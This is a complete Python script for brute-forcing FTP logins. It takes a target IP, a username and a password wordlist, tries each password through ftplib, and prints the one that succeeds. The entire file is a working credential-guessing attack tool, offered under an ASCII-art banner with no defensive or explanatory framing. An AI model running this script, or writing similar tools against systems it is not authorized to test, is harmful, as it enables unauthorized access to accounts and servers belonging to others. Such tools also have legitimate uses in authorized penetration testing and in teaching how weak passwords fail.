#!/usr/bin/env python

import ftplib
import argparse


class Colors:
    BLUE = "\033[94m"
    RED = "\033[91m"
    END = "\033[0m"


def print_banner():
    print(Colors.BLUE + """      
               ftp brute-forcer         
    
   
______ ___________ _                _       
|  ___|_   _| ___ \ |              | |      
| |_    | | | |_/ / |__  _ __ _   _| |_ ___ 
|  _|   | | |  __/| '_ \| '__| | | | __/ _ \
| |     | | | |   | |_) | |  | |_| | ||  __/
\_|     \_/ \_|   |_.__/|_|   \__,_|\__\___|
                                            :- M3hank
                                            

    """ + Colors.END)


def connect(host, user, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, password)
        print(Colors.RED + "\nLogin successfuly with password: " + password + Colors.END + '\n')
        ftp.quit()
        exit(0)
    except ftplib.all_errors:
        return False


def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description="FTP Brute-Forcer Tool")
    parser.add_argument("-t", "--target", required=True, help="Enter target IP")
    parser.add_argument("-u", "--user", required=True, help="Enter target user")
    parser.add_argument("-p", "--password", required=True, help="Wordlist")

    args = parser.parse_args()

    with open(args.password, 'r') as pwd_file:
        for word in pwd_file:
            word = word.strip()
            print("Testing:", word)
            connect(args.target, args.user, word)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print("Error:", str(e))
